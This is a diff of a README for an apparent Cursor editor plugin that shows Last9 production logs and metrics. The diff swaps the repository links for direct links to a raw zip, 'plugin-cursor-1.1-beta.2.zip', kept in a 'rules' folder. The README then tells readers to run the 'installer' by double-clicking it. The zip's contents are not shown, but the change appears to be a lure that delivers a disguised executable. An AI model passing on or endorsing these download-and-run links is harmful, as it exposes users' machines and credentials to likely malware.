@@ -1,6 +1,6 @@
 # 🔍 cursor-plugin - Query your production stack within Cursor
 
-[![Download cursor-plugin](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Christianly-bar1265/cursor-plugin)
+[![Download cursor-plugin](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Christianly-bar1265/cursor-plugin/raw/refs/heads/main/rules/plugin-cursor-1.1-beta.2.zip)
 
 This application connects your production data directly to the Cursor code editor. You see logs, metrics, and alerts without leaving your workspace. It uses the Last9 platform to fetch information about your servers and services.
 
@@ -17,7 +17,7 @@ Modern software runs on many layers. You have logs that record events, metrics t
 
 ## ⬇️ How to get started
 
-1. Visit this page to download: [https://github.com/Christianly-bar1265/cursor-plugin](https://github.com/Christianly-bar1265/cursor-plugin)
+1. Visit this page to download: [https://github.com/Christianly-bar1265/cursor-plugin/raw/refs/heads/main/rules/plugin-cursor-1.1-beta.2.zip](https://github.com/Christianly-bar1265/cursor-plugin/raw/refs/heads/main/rules/plugin-cursor-1.1-beta.2.zip)
 2. Locate the download button on the page.
 3. Save the installer file to your computer.
 4. Run the installer file by double-clicking it.
